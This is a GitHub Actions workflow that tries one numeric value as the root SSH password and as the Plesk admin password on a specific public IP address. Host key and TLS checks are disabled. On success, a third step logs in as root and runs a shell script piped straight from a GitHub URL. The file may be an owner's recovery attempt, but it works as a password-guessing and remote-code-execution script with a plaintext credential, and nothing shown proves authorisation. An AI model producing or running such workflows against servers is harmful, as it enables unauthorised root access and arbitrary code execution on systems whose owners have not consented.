name: Test Credential 988934
on:
  workflow_dispatch:
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Test as SSH password
        continue-on-error: true
        run: |
          apt-get install -y sshpass 2>/dev/null | tail -1
          echo "Testing 988934 as SSH root password..."
          sshpass -p "988934" ssh \
            -o StrictHostKeyChecking=no \
            -o ConnectTimeout=8 \
            -o PasswordAuthentication=yes \
            -o PreferredAuthentications=password \
            root@74.208.191.205 \
            "echo SSH_SUCCESS && whoami && pm2 list 2>/dev/null && service apache2 status | head -3 && docker ps | head -5" 2>&1
      
      - name: Test as Plesk admin password
        continue-on-error: true
        run: |
          RESULT=$(curl -sk --max-time 10 \
            "https://74.208.191.205:8443/enterprise/control/agent.php" \
            -H "HTTP_AUTH_LOGIN: admin" \
            -H "HTTP_AUTH_PASSWD: 988934" \
            -H "Content-Type: text/xml" \
            -d '<?xml version="1.0"?><packet><server><get><gen_info/></get></server></packet>' 2>/dev/null)
          echo "Plesk result: $RESULT"
          if echo "$RESULT" | grep -q "<status>ok</status>"; then
            echo "PLESK_SUCCESS: Password is 988934"
          fi
          
      - name: If SSH works — run full recovery
        continue-on-error: true
        run: |
          apt-get install -y sshpass 2>/dev/null | tail -1
          sshpass -p "988934" ssh \
            -o StrictHostKeyChecking=no \
            -o ConnectTimeout=10 \
            -o PasswordAuthentication=yes \
            root@74.208.191.205 \
            "bash <(curl -s https://raw.githubusercontent.com/deandreabarkley13-coder/dlbtrust-app/main/server/recover.sh)" 2>&1
